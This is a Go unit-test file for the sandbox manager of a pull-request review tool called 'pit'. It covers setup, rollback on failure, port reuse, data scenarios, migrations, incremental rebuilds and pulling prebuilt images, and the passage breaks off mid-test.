package sandbox_test

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/thannoz/pit/internal/config"
	"github.com/thannoz/pit/internal/data/datatest"
	"github.com/thannoz/pit/internal/errs"
	"github.com/thannoz/pit/internal/forge"
	"github.com/thannoz/pit/internal/ports"
	"github.com/thannoz/pit/internal/proc"
	"github.com/thannoz/pit/internal/runtime/runtimetest"
	"github.com/thannoz/pit/internal/sandbox"
	"github.com/thannoz/pit/internal/snapshot"
	"github.com/thannoz/pit/internal/state"
	"github.com/thannoz/pit/internal/workspace"
)

// quietReporter records the narration instead of printing it.
type quietReporter struct {
	begun []string
	steps []string
	notes []string
}

func (r *quietReporter) Begin(name string, _ bool) { r.begun = append(r.begun, name) }
func (r *quietReporter) Done(format string, args ...any) {
	r.steps = append(r.steps, fmt.Sprintf(format, args...))
}
func (r *quietReporter) Note(format string, args ...any) {
	r.notes = append(r.notes, fmt.Sprintf(format, args...))
}
func (r *quietReporter) Stdout() io.Writer { return io.Discard }
func (r *quietReporter) Stderr() io.Writer { return io.Discard }

// upFixture builds a real git repository with a pull request, plus the
// manager to review it with.
func upFixture(t *testing.T) (*sandbox.Manager, sandbox.UpRequest, *runtimetest.Fake) {
	t.Helper()

	repo := newUpstream(t)
	stateDir := t.TempDir()
	store, err := state.Open(stateDir)
	if err != nil {
		t.Fatalf("state.Open: %v", err)
	}

	fake := runtimetest.New("web")
	m := &sandbox.Manager{
		Store: store, Runtime: fake, Git: proc.Exec{}, Proc: proc.Exec{},
		Data: datatest.New(), StateDir: stateDir,
	}

	cfg, err := config.Parse([]byte("web:\n  service: web\n  port: 80\n"))
	if err != nil {
		t.Fatalf("config.Parse: %v", err)
	}

	req := sandbox.UpRequest{
		Repo:   repo,
		PR:     forge.PR{Number: 7, Title: "A change", Author: "lisa", Branch: "feature", State: forge.Open},
		Config: cfg,
	}
	return m, req, fake
}

// TestUpBuildsAndRecords is the acceptance criterion for T-309b.
func TestUpBuildsAndRecords(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	rep := &quietReporter{}

	record, err := m.Up(t.Context(), req, rep)
	if err != nil {
		t.Fatalf("Up: %v", err)
	}

	if record.Port < 40000 || record.Port > 49999 {
		t.Errorf("Port = %d, outside pit's range", record.Port)
	}
	if record.URL == "" || record.SHA == "" || record.Worktree == "" {
		t.Errorf("record = %+v, want it fully populated", record)
	}
	if !fake.IsUp(record.Project) {
		t.Error("the services were never started")
	}

	// The worktree really holds the pull request's change.
	if _, err := os.Stat(filepath.Join(record.Worktree, "pr.txt")); err != nil {
		t.Errorf("the worktree does not hold the change: %v", err)
	}

	f, err := m.Store.Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if _, ok := f.Find(req.Repo.Identity.Ref(), 7); !ok {
		t.Error("the sandbox was not recorded")
	}

	// Every step announces itself before it runs and reports when it
	// is done, so the display always has something to show.
	if len(rep.begun) != len(rep.steps) {
		t.Errorf("%d steps begun but %d finished: %v / %v", len(rep.begun), len(rep.steps), rep.begun, rep.steps)
	}
	for _, want := range []string{"fetch", "worktree", "services", "healthy"} {
		if !slices.Contains(rep.begun, want) {
			t.Errorf("the step %q was never announced: %v", want, rep.begun)
		}
	}
}

// TestUpUndoesEverythingWhenAStepFails is the property T-310 depends
// on: a half-built sandbox holds a port, a worktree and containers that
// nothing knows about.
func TestUpUndoesEverythingWhenAStepFails(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}

	failures := map[string]string{
		"the services never start":     "Up",
		"the services never get ready": "WaitReady",
	}

	for name, method := range failures {
		t.Run(name, func(t *testing.T) {
			m, req, fake := upFixture(t)
			fake.Fail[method] = errors.New("something went wrong")

			if _, err := m.Up(t.Context(), req, &quietReporter{}); err == nil {
				t.Fatal("want an error")
			}

			assertNothingLeftBehind(t, m, req)
		})
	}
}

// TestUpUndoesEverythingWhenCancelled is the acceptance criterion for
// T-310, at the level where it can be tested deterministically.
func TestUpUndoesEverythingWhenCancelled(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)

	ctx, cancel := context.WithCancel(t.Context())
	// Cancel while the services are being started, which is where a
	// reviewer's Ctrl+C usually lands.
	fake.Fail["WaitReady"] = context.Canceled
	cancel()

	if _, err := m.Up(ctx, req, &quietReporter{}); err == nil {
		t.Fatal("want an error")
	}

	// The cleanup must not use the cancelled context: every command
	// would refuse to start, and nothing would be undone.
	assertNothingLeftBehind(t, m, req)
}

func assertNothingLeftBehind(t *testing.T, m *sandbox.Manager, req sandbox.UpRequest) {
	t.Helper()

	worktree := req.Repo.Identity.WorktreeDir(m.StateDir, req.PR.Number)
	if _, err := os.Stat(worktree); !os.IsNotExist(err) {
		t.Errorf("%s survived the failure", worktree)
	}

	if _, err := workspace.ResolveRef(t.Context(), proc.Exec{}, req.Repo.Root, workspace.LocalRef(req.PR.Number)); err == nil {
		t.Error("the fetched ref survived the failure")
	}

	out, err := proc.Exec{}.Output(t.Context(), proc.Command{
		Name: "git", Args: []string{"worktree", "list"}, Dir: req.Repo.Root,
	})
	if err != nil {
		t.Fatalf("git worktree list: %v", err)
	}
	if bytes.Count(out, []byte("\n")) != 1 {
		t.Errorf("git still knows about a worktree:\n%s", out)
	}

	f, err := m.Store.Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(f.Sandboxes) != 0 {
		t.Errorf("the failed setup was recorded anyway: %+v", f.Sandboxes)
	}
}

func TestUpRunsTheConfiguredHooks(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)

	marker := filepath.Join(t.TempDir(), "hook-ran")
	req.Config.Hooks.AfterUp = []string{"touch " + marker}

	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("Up: %v", err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Errorf("the hook did not run: %v", err)
	}
}

func TestUpUndoesEverythingWhenAHookFails(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	req.Config.Hooks.AfterUp = []string{"false"}

	if _, err := m.Up(t.Context(), req, &quietReporter{}); err == nil {
		t.Fatal("want an error from the failing hook")
	}
	assertNothingLeftBehind(t, m, req)
}

func TestUpDoesNotReuseAPortItAlreadyHandedOut(t *testing.T) {
	// Two sandboxes started in quick succession can otherwise pick the
	// same number: the first has not bound it when the second checks.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)

	first, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("Up: %v", err)
	}

	req.PR.Number = 8
	addPullRequest(t, req.Repo.Root, 8)
	second, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("second Up: %v", err)
	}

	if first.Port == second.Port {
		t.Errorf("both sandboxes got port %d", first.Port)
	}
}

func TestSandboxAge(t *testing.T) {
	box := state.Sandbox{CreatedAt: time.Now().Add(-90 * time.Minute)}
	if box.Age() < time.Hour {
		t.Errorf("Age() = %v, want about 90 minutes", box.Age())
	}
}

// scenario configures one named data state and returns the fake store
// it will be applied against.
func scenario(t *testing.T, m *sandbox.Manager, req sandbox.UpRequest) *datatest.Fake {
	t.Helper()

	req.Config.Data.Scenarios = []config.Scenario{{
		Name:        "standard",
		Description: "3 users, 20 products, 5 orders",
		Apply:       []string{"compose exec -T db psql -f /fixtures/standard.sql"},
	}}
	req.Config.Data.Default = "standard"

	store, ok := m.Data.(*datatest.Fake)
	if !ok {
		t.Fatalf("the fixture's data store is %T", m.Data)
	}
	return store
}

// TestUpAppliesTheDefaultScenario is the acceptance criterion for
// T-403: a sandbox comes up in the state the repository declared,
// without the reviewer asking for anything.
func TestUpAppliesTheDefaultScenario(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	store := scenario(t, m, req)
	rep := &quietReporter{}

	record, err := m.Up(t.Context(), req, rep)
	if err != nil {
		t.Fatalf("Up: %v", err)
	}

	if applied := store.Applied(); !slices.Equal(applied, []string{"standard"}) {
		t.Fatalf("applied %v, want the configured default", applied)
	}
	// Recorded, so that `pit ls` can say what a sandbox was started
	// with without reading a configuration that may have changed.
	if record.Scenario != "standard" {
		t.Errorf("the record says %q was loaded", record.Scenario)
	}
	if !slices.Contains(rep.steps, "scenario standard") {
		t.Errorf("the narration does not say which data was loaded:\n%v", rep.steps)
	}
}

// TestUpLeavesTheDataAloneWithoutAScenario is the control: the step
// has to be absent when nothing is configured, or the assertion above
// proves nothing.
func TestUpLeavesTheDataAloneWithoutAScenario(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	rep := &quietReporter{}

	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("Up: %v", err)
	}

	store := m.Data.(*datatest.Fake)
	if applied := store.Applied(); len(applied) != 0 {
		t.Errorf("applied %v although no scenario is configured", applied)
	}
	if slices.Contains(rep.begun, "data") {
		t.Errorf("a data step was announced anyway:\n%v", rep.begun)
	}
}

func TestUpAppliesTheScenarioAfterTheMigrations(t *testing.T) {
	// A fixture that loads before the migration that creates its table
	// fails in a way that is tedious to diagnose; and once pit says
	// the sandbox answers, it has to answer with the data.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	scenario(t, m, req)
	req.Config.Hooks.AfterUp = []string{"true"}
	req.Config.Data.Migrate = []string{"true"}
	rep := &quietReporter{}

	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("Up: %v", err)
	}

	want := []string{"fetch", "worktree", "build", "services", "hooks", "migrate", "data", "healthy"}
	if !slices.Equal(rep.begun, want) {
		t.Errorf("steps ran as %v, want %v", rep.begun, want)
	}
}

func TestUpUndoesEverythingWhenTheScenarioFails(t *testing.T) {
	// A sandbox whose data never loaded looks ready and shows an empty
	// screen, which is the failure this whole stage exists to prevent.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	store := scenario(t, m, req)
	store.Err = errors.New("relation \"orders\" does not exist")

	if _, err := m.Up(t.Context(), req, &quietReporter{}); err == nil {
		t.Fatal("want an error from the failing scenario")
	}
	assertNothingLeftBehind(t, m, req)
}

func TestUpRejectsAScenarioThatIsNotConfigured(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	scenario(t, m, req)
	req.Scenario = "standrad"

	_, err := m.Up(t.Context(), req, &quietReporter{})
	if err == nil {
		t.Fatal("want an error for a scenario that is not configured")
	}
	if !strings.Contains(err.Error(), "standrad") {
		t.Errorf("error = %q, want it to quote the name", err)
	}
	if hint := errs.Hint(err); !strings.Contains(hint, `did you mean "standard"?`) {
		t.Errorf("hint = %q, want the suggestion", hint)
	}
	// And it has to be caught before anything was built, not after.
	if slices.Contains(fake.Methods(), "Up") {
		t.Error("the services were started for a scenario that does not exist")
	}
	assertNothingLeftBehind(t, m, req)
}

// TestUpNamesAFailedMigrationAsOne is the acceptance criterion for
// T-407.
func TestUpNamesAFailedMigrationAsOne(t *testing.T) {
	// A migration is frequently the change being reviewed. Reporting
	// it as "a hook failed" hides the one thing the reviewer most
	// wants to know.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	req.Config.Hooks.AfterUp = []string{"true"}
	req.Config.Data.Migrate = []string{"false"}

	_, err := m.Up(t.Context(), req, &quietReporter{})
	if err == nil {
		t.Fatal("want an error from the failing migration")
	}

	msg := err.Error()
	if !strings.Contains(msg, "data.migrate entry 1") {
		t.Errorf("error = %q, want it to name the migration", err)
	}
	if strings.Contains(msg, "hook") {
		t.Errorf("error = %q, want it not to blame a hook", err)
	}
	assertNothingLeftBehind(t, m, req)
}

func TestUpMigratesBeforeTheData(t *testing.T) {
	// A fixture that loads before the table it fills exists fails in a
	// way that is tedious to diagnose.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	store := scenario(t, m, req)
	req.Config.Data.Migrate = []string{"false"}

	if _, err := m.Up(t.Context(), req, &quietReporter{}); err == nil {
		t.Fatal("want an error from the failing migration")
	}
	if applied := store.Applied(); len(applied) != 0 {
		t.Errorf("the scenario was applied although the migration failed: %v", applied)
	}
}

func TestUpRecordsHowLongEachStepTook(t *testing.T) {
	// Optimising P5 without this would be guessing. The record is
	// what a measurement is: taken while it happened, not afterwards.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	scenario(t, m, req)
	req.Config.Hooks.AfterUp = []string{"true"}
	req.Config.Data.Migrate = []string{"true"}

	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("Up: %v", err)
	}

	var names []string
	var counted int64
	for _, s := range record.Steps {
		names = append(names, s.Name)
		counted += s.Millis
	}

	want := []string{"fetch", "worktree", "build", "services", "hooks", "migrate", "data", "healthy"}
	if !slices.Equal(names, want) {
		t.Errorf("recorded %v, want every step in the order it ran", names)
	}
	// The whole setup has to be at least the sum of its parts; the
	// difference is the work between the steps.
	if record.SetupMillis < counted {
		t.Errorf("the setup took %dms but its steps add up to %dms", record.SetupMillis, counted)
	}
	if record.SetupMillis <= 0 {
		t.Error("the setup is recorded as having taken no time at all")
	}
}

func TestUpRecordsNoStepsItDidNotRun(t *testing.T) {
	// The control: a project without hooks, migrations or scenarios
	// must not be given rows of zeros for them.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)

	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("Up: %v", err)
	}

	for _, s := range record.Steps {
		if s.Name == "hooks" || s.Name == "migrate" || s.Name == "data" {
			t.Errorf("recorded a %q step although none was configured", s.Name)
		}
	}
}

// TestUpReusesARunningSandbox is the acceptance criterion for T-503.
func TestUpReusesARunningSandbox(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)

	first, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("first Up: %v", err)
	}

	rep := &quietReporter{}
	second, err := m.Up(t.Context(), req, rep)
	if err != nil {
		t.Fatalf("second Up: %v", err)
	}

	if second.URL != first.URL {
		t.Errorf("the second setup answers at %s, want the same URL as the first (%s)", second.URL, first.URL)
	}
	if !slices.Contains(rep.begun, "reuse") {
		t.Errorf("the second setup did not say it was reusing anything:\n%v", rep.begun)
	}
	// Nothing was built: the runtime was asked whether the sandbox
	// answers, and nothing else.
	if count := countMethod(fake.Methods(), "Up"); count != 1 {
		t.Errorf("the services were started %d times, want only the first", count)
	}
	if slices.Contains(rep.begun, "build") || slices.Contains(rep.begun, "services") {
		t.Errorf("the second setup built or started something:\n%v", rep.begun)
	}
}

func TestUpDoesNotHandBackASandboxOfTheOldCommit(t *testing.T) {
	// The control for reuse: a sandbox of yesterday's code answers
	// just as readily as one of today's, and handing it over would be
	// a review of something that is not under review.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)

	first, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("first Up: %v", err)
	}
	advancePullRequest(t, req.Repo.Root, req.PR.Number)

	rep := &quietReporter{}
	second, err := m.Up(t.Context(), req, rep)
	if err != nil {
		t.Fatalf("second Up: %v", err)
	}

	if slices.Contains(rep.begun, "reuse") {
		t.Errorf("a sandbox of the previous commit was handed over:\n%v", rep.begun)
	}
	if second.SHA == first.SHA {
		t.Errorf("the record still points at %s", first.SHA)
	}
}

func TestUpKeepsThePortWhenBuildingAgain(t *testing.T) {
	// A pull request that moves to a new port every time it is set up
	// again defeats the reason the ports are deterministic: a browser
	// tab that stays valid.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)

	first, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("first Up: %v", err)
	}

	// Not reusable any more: the services are gone, so the second
	// call goes the long way round.
	if err := fake.Down(t.Context(), sandbox.RuntimeSandbox(first), io.Discard, io.Discard); err != nil {
		t.Fatalf("Down: %v", err)
	}

	second, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("second Up: %v", err)
	}
	if second.Port != first.Port {
		t.Errorf("port moved from %d to %d", first.Port, second.Port)
	}
}

func countMethod(methods []string, want string) int {
	n := 0
	for _, m := range methods {
		if m == want {
			n++
		}
	}
	return n
}

// twoBuiltServices is a project where both services are built from
// source, each from its own directory -- the shape the incremental
// question is about.
const twoBuiltServices = `services:
  web:
    build: ./site
  api:
    build:
      context: ./api
      dockerfile: Dockerfile
`

// TestUpRebuildsOnlyWhatChanged is the acceptance criterion for T-504.
func TestUpRebuildsOnlyWhatChanged(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api"}

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"docker-compose.yml": twoBuiltServices,
		"site/Dockerfile":    "FROM nginx\n",
		"site/index.html":    "<h1>shop</h1>\n",
		"api/Dockerfile":     "FROM golang\n",
		"api/main.go":        "package main\n",
	})
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("first Up: %v", err)
	}

	// The author pushes a change to the frontend only.
	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"site/index.html": "<h1>shop, now with refunds</h1>\n",
	})

	rep := &quietReporter{}
	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("second Up: %v", err)
	}

	builds := callsTo(fake, "Build")
	if len(builds) != 2 {
		t.Fatalf("the runtime was asked to build %d times, want 2", len(builds))
	}
	if !slices.Equal(builds[0].Services, []string{"web", "api"}) {
		t.Errorf("the first setup built %v, want both services", builds[0].Services)
	}
	if !slices.Equal(builds[1].Services, []string{"web"}) {
		t.Errorf("the second setup built %v, want only web", builds[1].Services)
	}
	if !slices.Contains(rep.steps, "web built") {
		t.Errorf("the narration does not say what was rebuilt:\n%v", rep.steps)
	}
}

func TestUpRebuildsNothingForAChangeNoServiceContains(t *testing.T) {
	// A commit that only touches documentation leaves the sandbox
	// exactly as it is.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api"}

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"docker-compose.yml": twoBuiltServices,
		"site/Dockerfile":    "FROM nginx\n",
		"api/Dockerfile":     "FROM golang\n",
	})
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("first Up: %v", err)
	}

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"README.md": "a paragraph about refunds\n",
	})

	rep := &quietReporter{}
	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("second Up: %v", err)
	}

	if builds := callsTo(fake, "Build"); len(builds) != 1 {
		t.Errorf("something was built for a change no service contains: %+v", builds)
	}
	if !slices.Contains(rep.steps, "nothing to rebuild") {
		t.Errorf("the narration does not say that nothing was needed:\n%v", rep.steps)
	}
}

func TestUpRebuildsEverythingWhenTheComposeFileChanges(t *testing.T) {
	// What a diff means is worked out from the compose file. Once
	// that has moved, the diff cannot be read against it.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api"}

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"docker-compose.yml": twoBuiltServices,
		"site/Dockerfile":    "FROM nginx\n",
		"api/Dockerfile":     "FROM golang\n",
	})
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("first Up: %v", err)
	}

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"docker-compose.yml": twoBuiltServices + "  cache:\n    image: redis\n",
	})

	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("second Up: %v", err)
	}

	builds := callsTo(fake, "Build")
	if len(builds) != 2 || !slices.Equal(builds[1].Services, []string{"web", "api"}) {
		t.Errorf("the second setup built %v, want the whole project", builds)
	}
}

func callsTo(f *runtimetest.Fake, method string) []runtimetest.Call {
	var out []runtimetest.Call
	for _, c := range f.Calls() {
		if c.Method == method {
			out = append(out, c)
		}
	}
	return out
}

// updated brings a sandbox up, moves the pull request on by a commit,
// and returns the manager ready for the second setup.
func updated(t *testing.T) (*sandbox.Manager, sandbox.UpRequest, *datatest.Fake) {
	t.Helper()

	m, req, _ := upFixture(t)
	store := scenario(t, m, req)

	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("first Up: %v", err)
	}
	advancePullRequest(t, req.Repo.Root, req.PR.Number)
	return m, req, store
}

func TestUpKeepsTheDataOfASandboxItUpdates(t *testing.T) {
	// The reviewer has been working in this sandbox. A new commit is
	// no reason to throw away what they put in it.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, store := updated(t)

	rep := &quietReporter{}
	record, err := m.Up(t.Context(), req, rep)
	if err != nil {
		t.Fatalf("second Up: %v", err)
	}

	if applied := store.Applied(); len(applied) != 1 {
		t.Errorf("the data was loaded %d times, want only the first setup", len(applied))
	}
	if !slices.Contains(rep.steps, "kept as it was") {
		t.Errorf("the narration does not say the data was kept:\n%v", rep.steps)
	}
	if record.Scenario != "standard" {
		t.Errorf("Scenario = %q, want what is actually in the sandbox", record.Scenario)
	}
}

func TestUpReloadsTheDataWhenTheReviewerSaysSo(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, store := updated(t)

	var asked string
	req.Confirm = func(question string) bool {
		asked = question
		return true
	}

	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("second Up: %v", err)
	}

	if applied := store.Applied(); len(applied) != 2 {
		t.Errorf("the data was loaded %d times, want it loaded again", len(applied))
	}
	if !strings.Contains(asked, "standard") {
		t.Errorf("the question does not say what would be loaded: %q", asked)
	}
}

func TestUpDoesNotAskWhenAScenarioWasNamed(t *testing.T) {
	// Typing --scenario is an answer in itself.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, store := updated(t)
	req.Scenario = "leer"
	req.Config.Data.Scenarios = append(req.Config.Data.Scenarios, config.Scenario{
		Name:  "leer",
		Apply: []string{"compose exec -T db psql -f /fixtures/empty.sql"},
	})
	req.Confirm = func(string) bool {
		t.Error("the reviewer was asked although they had already said what they wanted")
		return false
	}

	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("second Up: %v", err)
	}

	if applied := store.Applied(); len(applied) != 2 || applied[1] != "leer" {
		t.Errorf("applied %v, want the scenario that was asked for", applied)
	}
	if record.Scenario != "leer" {
		t.Errorf("Scenario = %q, want what was loaded", record.Scenario)
	}
}

func TestUpKeepsThePortOfASandboxItUpdates(t *testing.T) {
	// The port is bound -- by this sandbox's own container -- so it
	// looks taken to anyone who asks, and the allocator would move the
	// pull request to the next one. A fake runtime binds nothing, so
	// this only shows up when something really holds the port.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)

	first, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("first Up: %v", err)
	}

	// On every interface, the way Docker publishes a port -- a
	// loopback-only listener does not collide with it everywhere.
	var lc net.ListenConfig
	listener, err := lc.Listen(t.Context(), "tcp", ":"+strconv.Itoa(first.Port))
	if err != nil {
		t.Fatalf("cannot hold the sandbox's port: %v", err)
	}
	defer func() { _ = listener.Close() }()

	advancePullRequest(t, req.Repo.Root, req.PR.Number)

	second, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("second Up: %v", err)
	}
	if second.Port != first.Port {
		t.Errorf("port moved from %d to %d while the sandbox was holding it", first.Port, second.Port)
	}
	if second.URL != first.URL {
		t.Errorf("URL moved from %s to %s", first.URL, second.URL)
	}
}

// TestUpPullsInsteadOfBuilding is the acceptance criterion for T-506.
func TestUpPullsInsteadOfBuilding(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api"}
	req.Config.Build.Prebuilt = "ghcr.io/acme/shop-{service}:{sha}"

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"docker-compose.yml": twoBuiltServices,
		"site/Dockerfile":    "FROM nginx\n",
		"api/Dockerfile":     "FROM golang\n",
	})
	sha := pullRequestHead(t, req.Repo.Root, req.PR.Number)
	fake.Prebuilt = map[string]bool{
		"ghcr.io/acme/shop-web:" + sha: true,
		"ghcr.io/acme/shop-api:" + sha: true,
	}

	rep := &quietReporter{}
	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("Up: %v", err)
	}

	if builds := callsTo(fake, "Build"); len(builds) != 0 {
		t.Errorf("something was built although every image had been published: %+v", builds)
	}
	if pulls := callsTo(fake, "Pull"); len(pulls) != 2 {
		t.Errorf("pulled %d images, want one per service", len(pulls))
	}
	if !slices.Contains(rep.steps, "web, api pulled") {
		t.Errorf("the narration does not say the images were pulled:\n%v", rep.steps)
	}
}

func TestUpBuildsWhatWasNotPublished(t *testing.T) {
	// A pull that finds nothing is an ordinary answer, not a failure:
	// nobody published that image, so pit builds it, which is what it
	// would have done anyway.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api"}
	req.Config.Build.Prebuilt = "ghcr.io/acme/shop-{service}:{sha}"

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"docker-compose.yml": twoBuiltServices,
		"site/Dockerfile":    "FROM nginx\n",
		"api/Dockerfile":     "FROM golang\n",
	})
	sha := pullRequestHead(t, req.Repo.Root, req.PR.Number)
	fake.Prebuilt = map[string]bool{"ghcr.io/acme/shop-web:" + sha: true}

	rep := &quietReporter{}
	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("Up: %v", err)
	}

	builds := callsTo(fake, "Build")
	if len(builds) != 1 || !slices.Equal(builds[0].Services, []string{"api"}) {
		t.Fatalf("built %+v, want only the service nobody published", builds)
	}
	if !slices.Contains(rep.steps, "web pulled, api built") {
		t.Errorf("the narration does not say which was which:\n%v", rep.steps)
	}
}

func TestUpNamesThePulledImageInTheOverride(t *testing.T) {
	// Compose has to be told to use the image instead of the build,
	// or the next command would build it after all.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api"}
	req.Config.Build.Prebuilt = "ghcr.io/acme/shop-{service}:{sha}"

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"docker-compose.yml": twoBuiltServices,
		"site/Dockerfile":    "FROM nginx\n",
		"api/Dockerfile":     "FROM golang\n",
	})
	sha := pullRequestHead(t, req.Repo.Root, req.PR.Number)
	fake.Prebuilt = map[string]bool{"ghcr.io/acme/shop-web:" + sha: true}

	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("Up: %v", err)
	}

	override := record.ComposeFiles[len(record.ComposeFiles)-1]
	written, err := os.ReadFile(override)
	if err != nil {
		t.Fatalf("cannot read the generated override: %v", err)
	}
	if !strings.Contains(string(written), "image: ghcr.io/acme/shop-web:"+sha) {
		t.Errorf("the override does not name the pulled image:\n%s", written)
	}
	if strings.Contains(string(written), "shop-api") {
		t.Errorf("the override names an image nobody published:\n%s", written)
	}
}

// eightServices is the shape the question is about: four services
// decide what a screen looks like, and four more cost build time and
// answer nothing a reviewer asked.
const eightServices = `services:
  web:
    build: ./site
    depends_on: [api]
  api:
    build: ./api
    depends_on:
      db:
        condition: service_started
      cache:
        condition: service_started
  db:
    image: postgres:16
  cache:
    image: redis:7
  worker:
    build: ./api
  mailer:
    image: mailhog/mailhog
  analytics:
    build: ./analytics
  docs:
    build: ./docs
`

func atEightServices(t *testing.T, req sandbox.UpRequest) {
	t.Helper()

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		"docker-compose.yml":   eightServices,
		"site/Dockerfile":      "FROM nginx\n",
		"api/Dockerfile":       "FROM golang\n",
		"analytics/Dockerfile": "FROM python\n",
		"docs/Dockerfile":      "FROM nginx\n",
	})
}

// TestUpStartsOnlyTheServicesAReviewNeeds is the acceptance criterion
// for T-508.
func TestUpStartsOnlyTheServicesAReviewNeeds(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api", "db", "cache"}
	atEightServices(t, req)
	// One entry point: what it needs comes with it.
	req.Config.Compose.Services = []string{"web"}

	rep := &quietReporter{}
	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("Up: %v", err)
	}

	ups := callsTo(fake, "Up")
	if len(ups) != 1 {
		t.Fatalf("started the services %d times, want once", len(ups))
	}
	want := []string{"web", "api", "db", "cache"}
	if !slices.Equal(ups[0].Services, want) {
		t.Errorf("started %v, want %v", ups[0].Services, want)
	}
	if !slices.Contains(rep.steps, "pit-"+req.Repo.Identity.Ref()+"-7, 4 of 8 services") {
